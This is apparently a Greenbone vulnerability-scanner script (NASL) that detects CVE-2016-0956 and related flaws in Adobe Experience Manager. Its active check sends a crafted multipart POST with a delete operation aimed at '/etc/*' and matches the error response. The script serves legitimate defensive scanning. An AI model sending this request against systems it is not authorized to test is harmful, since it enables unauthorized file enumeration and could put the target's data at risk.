# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:adobe:experience_manager";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807066");
  script_version("2023-09-26T05:05:30+0000");
  script_cve_id("CVE-2016-0955", "CVE-2016-0956", "CVE-2016-0957", "CVE-2016-0958");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-09-26 05:05:30 +0000 (Tue, 26 Sep 2023)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-10-09 19:58:00 +0000 (Tue, 09 Oct 2018)");
  script_tag(name:"creation_date", value:"2016-02-11 14:43:49 +0530 (Thu, 11 Feb 2016)");
  script_name("Adobe Experience Manager (AEM) Multiple Vulnerabilities (APSB16-05) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_adobe_aem_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("adobe/aem/http/detected");

  script_xref(name:"URL", value:"https://helpx.adobe.com/security/products/experience-manager/apsb16-05.html");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39435");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/83119");
  script_xref(name:"Advisory-ID", value:"APSB16-05");

  script_tag(name:"summary", value:"Adobe Experience Manager (AEM) is prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response if
  the system is affected by CVE-2016-0956.");

  script_tag(name:"insight", value:"The following flaws exist:

  - CVE-2016-0955: Cross-site scripting (XSS) vulnerability

  - CVE-2016-0956: Information disclosure in the Servlets Post component of Apache Sling as used in
  AEM

  - CVE-2016-0957: Dispatcher as used in AEM does not properly implement a URL filter

  - CVE-2016-0958: Unspecified vulnerability related to a crafted serialized Java object");

  script_tag(name:"impact", value:"- CVE-2016-0955: The flaw allows remote authenticated users to
  inject arbitrary web script or HTML via a folder title field that is mishandled in the Deletion
  popup dialog

  - CVE-2016-0956: Successful exploitation will allow remote unauthenticated users to enumerate
  local system files/folders that are not accessible publicly to unauthenticated users

  - CVE-2016-0957: The flaw allows remote attackers to bypass dispatcher rules via unspecified
  vectors

  - CVE-2016-0958: Unspecified impact");

  script_tag(name:"affected", value:"- CVE-2016-0955: AEM version 6.1.0

  - CVE-2016-0956: Apache Sling Framework version 2.3.6 as used in AEM versions 5.6.1, 6.0.0 and
  6.1.0

  - CVE-2016-0957: Adobe Dispatcher before version 4.1.5 as used in AEM versions 5.6.1, 6.0.0 and
  6.1.0

  - CVE-2016-0958: AEM versions 5.6.1, 6.0.0 and 6.1.0");

  script_tag(name:"solution", value:"Apply the hotfixes and updates described in the referenced
  vendor advisory.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/libs/granite/core/content/login.html";

host = http_host_name(port:port);

data = string('--------------------------87cb9e2d2eed80d5\r\n',
              'Content-Disposition: form-data; name=":operation"\r\n\r\n',
              'delete\r\n',
              '-------------------------87cb9e2d2eed80d5\r\n',
              'Content-Disposition: form-data; name=":applyTo"\r\n\r\n',
              '/etc/*\r\n',
              '--------------------------87cb9e2d2eed80d5--\r\n');

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Content-Length: ", strlen(data), "\r\n",
             "Content-Type: multipart/form-data; boundary=------------------------87cb9e2d2eed80d5\r\n",
             "\r\n", data, "\r\n");
res = http_keepalive_send_recv(port:port, data:req);

if(res && 'id="ChangeLog' >< res && res =~ "^HTTP/1\.[01] 500") {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
